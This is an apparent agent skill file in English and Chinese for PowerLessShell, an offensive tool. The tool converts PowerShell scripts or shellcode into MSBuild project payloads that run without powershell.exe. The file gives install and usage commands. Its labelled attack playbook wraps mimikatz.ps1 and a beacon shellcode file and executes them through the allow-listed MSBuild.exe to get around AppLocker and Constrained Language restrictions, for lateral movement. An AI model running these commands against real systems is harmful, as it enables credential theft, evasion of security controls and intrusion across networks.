---
name: powerlessshell-nolimits
description: "Execute without powershell.exe. Signals: lateral movement, psexec, shellcode mode."
zh-signals: "PowerLessShell: 无 powershell.exe 执行。信号:横向移动,psexec,shellcode 模式。"
---

# PowerLessShell

- 攻击大类:C31 远程服务横向移动
- 上游仓库:https://github.com/Mr-Un1k0d3r/PowerLessShell
- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/Mr-Un1k0d3r/PowerLessShell
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python PowerLessShell.py -type powershell -source enum.ps1 -output run.csproj` | 生成 MSBuild 载荷 |
| `目标机: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe run.csproj` | 执行 |
| `-type shellcode -source beacon.bin` | shellcode 模式 |

## 攻击场景 Playbook

### 无 powershell.exe 执行

```bash
python PowerLessShell.py -type powershell -source mimikatz.ps1 -o m.csproj
# MSBuild.exe 白名单进程执行,绕过限制
```

## 注意事项

把 PowerShell 转成 MSBuild .csproj 执行,Constrained Language/AppLocker 环境的经典绕过。
